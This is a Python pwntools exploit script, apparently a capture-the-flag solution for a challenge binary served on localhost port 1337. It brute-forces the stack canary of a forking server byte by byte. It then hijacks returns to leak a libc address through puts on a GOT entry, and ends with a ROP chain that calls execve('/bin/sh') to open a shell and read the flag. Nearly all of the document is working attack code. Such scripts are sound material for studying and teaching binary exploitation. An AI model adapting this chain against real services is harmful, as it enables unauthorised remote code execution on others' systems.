#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64")
elf = ELF("../server/app/chall.elf", False)
libc = ELF("libc.so.6", False)

s = remote("localhost", 1337)

gdbscript = \
"""
set follow-fork-mode child
b *make_copy+160
c
ni
ni
ni
ni
ni
ni
ni

"""

def main():
    r_canary = leak_canary()  # Reversed stack canary
    leak_libc(r_canary)
    rop2shell(r_canary)


def leak_canary() -> bytes:
    
    r_canary = b""  # Reversed stack canary
    canary_found = False
    while not canary_found:

        canary_byte = 0
        canary_byte_found = False
        while not canary_byte_found:

            s.sendlineafter(b"]: ", b"1")  # Create a copy
            s.recvuntil(b"Please confirm operational stability.")

            payload = flat(cyclic(24), r_canary, canary_byte.to_bytes())
            s.sendafter(b"]: ", payload)

            result = s.recvline()
            if b"lost" not in result:
                s.success(
                    "Canary byte #{} found: {}".format(
                        len(r_canary) + 1, hex(canary_byte)
                    )
                )
                canary_byte_found = True
                r_canary += canary_byte.to_bytes()
            else:
                canary_byte += 1

        s.sendlineafter(b"]: ", b"2")  # Terminate the clone

        if len(r_canary) == 8:
            s.success(f"Complete canary recovered: { r_canary[::-1].hex() }")
            canary_found = True

    return r_canary


def leak_libc(r_canary: bytes):

    #####################################################################
    # 1. Hijack return to make_copy to perform read() with controlled RBP
    #####################################################################

    s.sendlineafter(b"]: ", b"1")  # Create a copy
    s.recvuntil(b"Please confirm operational stability.")

    rw_memory = elf.sym.data_start + 0x100  # Writable area in .data section

    # make_copy():
    #   <+143>: lea rax, [rbp-0x20]
    #   <+152>: mov rsi, rax
    #   <+155>: mov edi, 0
    #   <+160>: call read@plt

    payload = flat(
        cyclic(24),                    # padding
        r_canary,                      # valid canary
        p64(rw_memory + 0x20),         # new RBP
        p64(elf.sym.make_copy + 143),  # return into read() setup
    )
    s.sendafter(b"]: ", payload)

    #############################################################
    # 2. Return into intro to call puts() with controlled pointer
    #############################################################

    # intro():
    #   <+112>: mov rax, QWORD PTR [rbp-0x8]
    #   <+119>: call puts@plt

    sleep(1)  # Prevent input merging
    payload = flat(
        p64(elf.got.getpid),       # address to leak
        cyclic(0x10),              # padding
        r_canary,                  # canary again
        p64(rw_memory + 0x8),      # RBP for intro()
        p64(elf.sym.intro + 112),  # call puts(getpid@GOT)
    )
    s.sendline(payload)

    leak = s.recvline(False)
    libc.address = u64(leak.ljust(8, b"\x00")) - libc.sym.getpid
    s.success(f"Libc base address: { hex(libc.address) }")


def rop2shell(r_canary: bytes):

    s.sendlineafter(b"]: ", b"1")  # Create a copy
    s.recvuntil(b"Please confirm operational stability.")

    rop = ROP([elf, libc])
    binsh = next(libc.search(b"/bin/sh\x00"))
    rop.execve(binsh, 0, 0)

    payload = flat(
        cyclic(24),        # padding
        r_canary,          # canary
        p64(0xDEADBEEF),   # fake RBP
        rop.chain(),       # ROP chain to execve
    )
    s.sendafter(b"]: ", payload)

    sleep(1)  # Prevent input merging
    s.sendline(b"cat flag.txt")
    s.interactive()


if __name__ == "__main__":
    main()
